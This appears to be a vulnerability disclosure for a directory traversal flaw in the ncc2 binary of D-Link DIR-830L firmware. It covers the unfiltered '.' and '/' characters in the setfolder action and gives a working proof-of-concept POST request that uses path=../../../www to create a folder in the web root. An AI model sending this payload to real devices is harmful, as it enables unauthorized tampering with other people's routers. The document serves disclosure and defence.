# Summary
There is a directory traversal vulnerability in `ncc2` binary file of D-Link DIR830LA1_FW100B07, an attacker can escape from the restricted directory and create a folder in any writable path.

Fimware download link : 
https://legacyfiles.us.dlink.com/DIR-830L/REVA/FIRMWARE/DIR-830L_REVA_FIRMWARE_1.00B07.ZIP

Affected component is `callback_ccp_web_access` function and `web_access.ccp`.

# Details
Vulnerable code is in `callback_ccp_web_access` function of `ncc2` binary file,
when `ccp_act=setfolder`, `sub_4B188C` will be called:
![image](https://github.com/user-attachments/assets/02d8d849-620b-4064-90a9-65729467868d)

If the conditions are met, it will use `mkdir` to create a folder:
![image](https://github.com/user-attachments/assets/0dc1da94-1e2b-40e1-9d58-6b5454d49fe2)

It filters parameters `folder` and `path`, which means we can't inject command:
![image](https://github.com/user-attachments/assets/db4b7adc-b185-4e68-964e-d8b15d93a322)

However, it doesn't filter `.` and `/`, leading to directory traversal vulnerability.

An attacker can escape from the restricted directory and create a folder in any writable path.

Here we take creating "poc4.html" in the website root directory "/www" as an example:
```
POST /web_access.ccp

ccp_act=setfolder&tok=ip_addr=&folder=poc4.html&path=../../../www
```
![DIR830-Directory-Traversal](https://github.com/user-attachments/assets/33131461-7697-45c4-b351-e41583f6e225)



# PoC
**Login** first to get your cookie.
```
POST /web_access.ccp

ccp_act=setfolder&tok=ip_addr=&folder=poc4.html&path=../../../www
```
![DIR830-Directory-Traversal](https://github.com/user-attachments/assets/33131461-7697-45c4-b351-e41583f6e225)
